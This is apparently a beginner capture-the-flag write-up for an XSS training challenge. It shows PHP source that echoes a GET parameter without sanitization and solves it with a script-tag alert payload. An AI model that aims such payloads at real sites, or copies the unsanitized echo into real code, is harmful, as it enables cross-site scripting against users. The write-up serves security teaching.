---
layout: default
title: XSS Challenge by y0n3uchy Baby XSS 01
set: For Newbies
order: 1
---

Welcome to this XSS-related writeup series. We'll walk through some interesting XSS payloads and methods. This challenge requires us to execute `alert('XSS')` or `alert(document.domain)`

# [Baby XSS 01](https://xss.challenge.training.hacq.me/challenges/baby01.php)

In this first challenge, the webpage source is visible:

```
<script src="hook.js"></script>
<?php
echo $_GET["payload"];
?>

<h1>inject</h1>
<form>
    <input type="text" name="payload" placeholder="your payload here">
    <input type="submit" value="GO">
</form>

<h1>src</h1>
<?php highlight_string(file_get_contents(basename(__FILE__))); ?>
```

This code tells us enough to solve the challenge: 

```
<?php
echo $_GET["payload"];
?>
```

the web server will return anything we put inside the text without any [sanitization](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html). That means we can submit this payload:

>`<script>alert(document.domain)</script>`

and pass the challenge